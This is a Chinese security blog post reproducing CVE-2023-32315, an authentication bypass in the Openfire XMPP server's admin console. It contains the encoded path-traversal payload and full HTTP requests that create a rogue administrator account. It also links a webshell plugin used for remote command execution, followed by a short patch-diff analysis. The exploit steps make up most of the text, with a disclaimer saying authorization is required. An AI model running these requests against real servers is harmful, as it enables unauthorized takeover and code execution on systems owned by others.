<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DrqPA_8o-tcO7A-N5uX4vA)

获黑客教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

#### 简介

Openfire 是一个基于 XMPP 协议的即时通讯服务器，也称之为即时通讯平台。在即时通讯中往往因为需要保存一些状态或者数据所以不能采用点对点通讯，而是需要搭建服务器来转发。Openfire 的管理页面包含 5 个菜单选项，分别是服务器基本信息配置选项、用户组管理选项、会话管理选项、分组聊天选项和插件选项。

#### 影响版本

`3.10.0`<= Openfire <`4.6.8`

`4.7.0`<=Openfire <`4.7.5`

#### Openfire 搭建

下载地址

> https://github.com/igniterealtime/Openfire/releases/download/v4.7.3/openfire_4_7_3_x64.exe

本地安装好 jdk，windwos 版本直接安装

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakxDxibt3klapLEkgENIREMeSjbjRSBZoTDWlnAI6ZKQia6YGicE2OWBXkw/640?wx_fmt=jpeg)

下一步到最后完成安装

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakEBlCUh6ogDw7UlCgxfdscJB7QS6nEfQw5WqHSAUwgiccT84YstKcknA/640?wx_fmt=jpeg)

启动服务端

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakynbbOI4I0BSY2drXKeoJdCsmgR2lCI6WWA2yeynkPt6JclugksH4Zw/640?wx_fmt=jpeg)

访问

> http://localhost:9090

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakZlCJsJmvQvibERo4dAytzrJTBwnRZy8P9zppPZX5jKrbia3oNrwtWIAw/640?wx_fmt=jpeg)

为了复现没必要安装外联数据库

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakzMKF8p6AHhALZEQE0IYfCOciagR5hibs9edmB2ODFed84SwcbKcnr19Q/640?wx_fmt=jpeg)

安装完成后，管理界面

> http://localhost:9090/login.jsp

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4Aiakd986mpYp3Pk6RYDk35aZVjGNfFRz3Ec91zucesVUicdCwMG14FCQYOQ/640?wx_fmt=jpeg)

#### 漏洞复现

payload:

```
/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakKNJ0TEDG3r6jicNlOE2GsmvVfqahRunPB88FPfZ9GTBzOKGiaabFDiaAg/640?wx_fmt=jpeg)

第一步构造‘poc

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/plugin-admin.jsp HTTP/1.1
Host: 192.168.0.105:9090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.105:9090/user-summary.jsp
Connection: close
Upgrade-Insecure-Requests: 1


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakKDBEs5096noy2h6xliaby9me6fWShicS8IrMs15ntaS6icMWu1zd5VHcg/640?wx_fmt=jpeg)

获取到 cookie，第二步构造用户

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=eLn7fgybS8C4SNC&username=aaadmin&name=aaadmin&email=&password=1qaz2wsx&passwordConfirm=1qaz2wsx&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7 HTTP/1.1
Host: 192.168.0.105:9090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.105:9090/user-summary.jsp
Connection: close
Cookie: JSESSIONID=node0xglgmlc1v8s71iojn4ob0crsb9.node0; csrf=eLn7fgybS8C4SNC
Upgrade-Insecure-Requests: 1


```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakxQu0p28sdyX43DYPialr85lEIEGkYsLI8bB5dWvc0LdxicBoicibFOlJoA/640?wx_fmt=jpeg)  
使用`aaadmin/1qaz2wsx`登录

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakjhrRDGpLtZECAqiaRtTOwnudXG3nce2uqrTwMaa0oGcxLEc6Tyg5Jzw/640?wx_fmt=jpeg)

且在 poc 中设置用户为管理员用户

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4Aiak9AZKlfWjBxsYVibsuJ6Xib89qKh8syiavjQAVOVXLWFo7UZcWaa82Oy0Q/640?wx_fmt=jpeg)

当然这里利用网上师傅写好的 go 工具可一键利用，这中利用产生点跟`通达OA`的`老洞`类似。

#### RCE

根据目前已经披露的利用方法分为两步，这里的 RCE 是在属于后渗透的利用，根据创建的用户利用插件功能上传 webshell

插件下载地址

> https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/tag/v0.1

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakibgeC0yqoMBb45uRFw7cz78Cc91NzRfWAq1ptT6Dd3xxN9dVf0IlPiag/640?wx_fmt=jpeg)

插件上传成功

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakbVBzTfeq88cv8ibwDAvArLMmKribF6077RRlAGZv31vibuz7VdyE6Kiakg/640?wx_fmt=jpeg)

这里密码为`123`, 进入`服务器-》服务器设置-》shellplugin`，输入密码

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakndKhUeXEcMrica8icnOuDRAMpJ428JhCNkelF9XYhEHNTPrYukSMoTvQ/640?wx_fmt=jpeg)

通过该 jar 包实现 RCE

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakAAO4gOoPoUQ2TJK9rQiaD9hb8rL3a43PbENhXmaOubeGicvkHLkAPQSQ/640?wx_fmt=jpeg)

可对文件操作，执行系统命令

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakxMM88okd49HNYZ7NovwxCibVFbkn4rd8icjplcpUfaSRuIdoqBc2m4hw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakicykRhB1XGNpBEQticjkG6IjBoBGHkx8Mx30bO7kaKlQxeDdUneqXlsg/640?wx_fmt=jpeg)

#### 漏洞分析

这里对比一下`4.7.5`版本和`4.7.4`版本的区别

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakgNWhYPkUZMm8ia56niciaWib7LeVMUNKGljjMWkcU6ebue6neN3vjOdQSQ/640?wx_fmt=jpeg)

从未授权的位置看`xmppserver/src/main/java/org/jivesoftware/admin/AuthCheckFilter.java`代码中对于身份权限增加了校验

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakBTys2t1gqcK2sU4Kbn89knutnM37o01IznqXVHScYEtWX6bspiawqlw/640?wx_fmt=jpeg)

在配置文件`xmppserver/src/main/webapp/WEB-INF/web.xml`中

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakkxYy4o8aZQchvwYiataBlRCBmxTPGVHYM4sjNqJtALVXDMA1yDz0LNA/640?wx_fmt=jpeg)

查看到对 excludes 的值的定义，payload 的的构造是满足 158 行的内容

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4AiakRMtfzTDvkK0gZucBgHGcKLPApGGRVMg8Ej85YIANU6S3BZzrfwTN6g/640?wx_fmt=jpeg)

当构造`../../`的时候是满足 159 行的 if 条件，但是在 payload 中对该内容做了 utf8 的编码，所以绕过了 161 行的 if 判断，导致了未授权的产生，使之能够绕过权限校验。

所以在`4.7.5`的版本中也增加对 utf8 的解码

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSFqp8KiaiatKtic3sDAntp4Aiakia22uLnXx3SumUfaVys8EZNjL5GmIwcKfdsLyjWB5C0NZfhczx6kFvQ/640?wx_fmt=jpeg)

#### 参考链接

https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass

```
原文地址:https://www.sec-in.com/article/2232

```

声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！

@

**学习更多渗透技能！体验靶场实战练习**

```
（hack视频资料及工具）


```

（部分展示）

往期推荐

[

给第一次做渗透项目的新手总结的一些感悟



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247567614&idx=1&sn=d2574a0e08aa40af7905e29d2dc87e84&chksm=ebeb81d3dc9c08c5cf67ba30beca4fb3c4eb43fe70fd3731edeb670c0c1423af3a8984c9de53&scene=21#wechat_redirect)

[

「登陆页面」常见的几种渗透思路与总结！



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247552705&idx=1&sn=5921efbffcfd42b3e8d578d8f9295c60&chksm=ebea47ecdc9dcefa2c202ac765a199999ef595bc0ea9dd27fc2d5da1b92f21452a17c5c16188&scene=21#wechat_redirect)

[

突破口！入职安服后的经验之谈



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247495613&idx=1&sn=2fcfb9e0f1d47e24b634f1586ffebe8c&chksm=ebeaa690dc9d2f8638afc42a0f02a0e752a9f6d2a7bb6a3334fdb2c04dfad39914e1e913328d&scene=21#wechat_redirect)

[

红队渗透下的入口权限快速获取



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247550034&idx=1&sn=654ea58293a45c3ed5db6d4d32c9a57a&chksm=ebea4d7fdc9dc4690c21119fe028c655f6cd5f976c54c79af736064c19a47fcd99f6ff846a72&scene=21#wechat_redirect)

[

攻防演练｜红队手段之将蓝队逼到关站！



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247541662&idx=1&sn=343a8d7764dde2121f6b0373aa4dbd28&chksm=ebea6ab3dc9de3a5ad1f7eadd96bd2d42375d7f4c40bd8c4ea4b4dc000415097a0e3fe0fbd38&scene=21#wechat_redirect)

[

CNVD 之 5000w 通用产品的收集 (fofa)



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247543436&idx=1&sn=c0a7481697648512e9f314594b10f304&chksm=ebea63a1dc9deab7b3b07e7f692f2d83cff78a3fcc64dbfa91ec03b88eb1a4940589298ed5fd&scene=21#wechat_redirect)

[

自动化挖掘 cnvd 证书脚本



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247558287&idx=1&sn=5ed10ac4f4d34db64b722f228e3da1f5&chksm=ebebada2dc9c24b4ea13c98034bb5981ea991691c5b730ff4f83f11dadc487b941cb7a1ce7ac&scene=21#wechat_redirect)

[

Xray 捡洞中的高频漏洞



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247543338&idx=1&sn=5e9785e8832acd77232cfe45944285f6&chksm=ebea6307dc9dea11f1862284f24607ce970c4e24bbafc16d6d249bedd283a4c3cf68fc41d8e2&scene=21#wechat_redirect)

[

实战｜通过供应链一举拿下目标后台权限



](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247543100&idx=1&sn=2d4abc345b450d41b802b419c9b2a797&chksm=ebea6011dc9de907ebc4eca7b6541df614c03a810a4263278a885700d3b06525019a4bf69577&scene=21#wechat_redirect)

[实战｜一次真实的域渗透拿下域控（内网渗透）](https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247542735&idx=1&sn=1d47080088a36f8a5cafdc50ae718b0b&chksm=ebea6ee2dc9de7f461437399cec4079875f7c988eeb63eef0dc8dd77c9ed20ab33396b44218f&scene=21#wechat_redirect)

看到这里了，点个 “赞”、“再看” 吧